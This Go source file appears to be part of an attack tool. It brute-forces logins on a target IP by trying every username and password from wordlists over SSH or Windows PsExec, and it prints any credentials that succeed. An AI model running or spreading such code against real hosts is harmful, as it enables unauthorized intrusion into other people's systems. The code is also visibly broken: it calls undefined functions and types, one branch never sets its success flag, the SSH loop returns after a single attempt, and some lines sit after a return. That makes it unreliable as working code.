package main

import (
	"sync"
	"fmt"
	"runtime"
	"golang.org/x/crypto/ssh"
)




func gettingin(myip string, wg *sync.WaitGroup, myos string, targetos string) {

	try_creds(myip,targetos)
	defer wg.Done()
}

func try_creds(myip string, targetos string)(){
	myos := runtime.GOOS
	var user = readinfile("user.txt")
	var passwds = readinfile("passwds.txt")
	iswork := false
	username := "username"
	password := "password"
	switch targetos {
	case "windows":
		iswork, username, password = perform_psexec(myip,user,passwds, myos)
		if iswork {
			fmt.Println( "ip:",myip,"username:",username,"password:", password)
		}
	case "linux":
		sessioninfo := perform_ssh(myip,user,passwds)
		if iswork {
			fmt.Println( "ip:",myip,"username:",username,"password:", password)
		}
		return
	}
	if iswork {
		fmt.Println( "ip:",myip,"username:",username,"password:", password)
	}
}


func perform_ssh(myip string,user []string, passwds []string)(infosession){
	for j := 0; j < len(user); j++ {
		for k := 0; k < len(passwds); k++ {
			n, err := getinssh(myip, user[j], passwds[k],22)
			if err != nil {
			}
			return n
		}
	}
	return infosession{false, "", "", nil}
}



func perform_psexec(myip string, user []string, passwds []string, myos string)(result bool, username string, password string) {
	passbreak := true
	for j := 0; j < len(user); j++ {
		for k := 0; k < len(passwds); k++ {
			switch myos {
			case "windows":
				wincon := getinwin(myip, user[j], passwds[k])
				switch wincon {
				case 1:
					username = user[j]
					password = passwds[k]
					result = true
					passbreak = true
					break
				case 2:
					fmt.Printf("\n didnt work windows with %s %s %s", myip, user[j], passwds[k])
					result=false
				default:
					return
					fmt.Println("target machine does not have psexec enabled")
					result = false
					passbreak = true
					break
				}
			default:
				fmt.Println("cant get onto windows from nonwindows :(")
				result=false
				passbreak = true
				break

			}
			if passbreak {
				break
			}
		}
	}
}